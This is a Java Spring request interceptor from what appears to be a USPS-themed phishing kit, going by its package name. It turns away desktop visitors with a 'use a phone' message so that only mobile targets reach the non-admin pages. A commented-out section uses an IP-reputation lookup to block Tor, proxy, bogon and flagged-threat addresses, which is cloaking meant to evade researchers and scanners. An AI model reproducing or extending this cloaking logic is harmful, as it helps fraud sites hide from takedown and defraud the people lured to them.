package com.uspsassa.phishing.interceptor;

import cn.hutool.extra.spring.SpringUtil;
import co.ipregistry.api.client.IpregistryClient;
import co.ipregistry.api.client.model.IpInfo;
import co.ipregistry.api.client.util.UserAgent;
import com.uspsassa.phishing.entity.Setting;
import com.uspsassa.phishing.exception.LimitDesktopException;
import com.uspsassa.phishing.service.SettingService;
import eu.bitwalker.useragentutils.OperatingSystem;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import static eu.bitwalker.useragentutils.DeviceType.COMPUTER;

public class SecurityInterceptor implements HandlerInterceptor {
    //threat 威胁
    //abuser 恶意用户
    //attacker 攻击者

    //tor 虚拟网络
    //torExitNode 虚拟网络出口
    //bogon 伪造ip
    //anonymous 匿名

    //proxy 代理
    //vpn 虚拟网络
    //cloud_provider 云服务商
    //relay 云服务商
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String ua = request.getHeader("User-Agent");
        //判断是否非电脑

        //获取设配信息
        boolean bot = UserAgent.isBot(ua);
        //获取配置 查看是否开启了拦截
        Setting setting = SpringUtil.getBean(SettingService.class).getSetting();
        final IpregistryClient client = new IpregistryClient(setting.getIpregisterKey());
        //获取ip
        String ip = request.getRemoteAddr();
        final IpInfo ipInfo;
        //获取uri
        String uri = request.getRequestURI();
        //判断是否管理员
        if (!uri.contains("/admin")) {
            //非管理员 电脑校验
            if (setting.getLinitDesktop()) {
                //判断是否是电脑
                eu.bitwalker.useragentutils.UserAgent userAgent = eu.bitwalker.useragentutils.UserAgent.parseUserAgentString(ua);
                // 操作系统信息
                OperatingSystem operatingSystem = userAgent.getOperatingSystem();
                System.out.println(ua);
                if (COMPUTER.equals(userAgent.getOperatingSystem().getDeviceType())) {
                    throw new LimitDesktopException("请使用手机访问");
                }
            }
        }

        //安全验证
//        try {
//            ipInfo = client.lookup(ip);
//            Security security = ipInfo.getSecurity();
//            //判断是否是恶意用户
//            if (security.isAbuser() && security.isAttacker() && security.isThreat() && security.isTor() && security.isTorExitNode() && security.isBogon() && security.isAnonymous()) {
//                throw new NetworkException("网络状态异常");
//            }
//        } catch (final ApiException e) {
//            throw new NetworkException("服务器异常，请联系管理员处理");
//        } catch (final ClientException e) {
//            throw new NetworkException("网络状态异常");
//        }
        return true;
    }
}
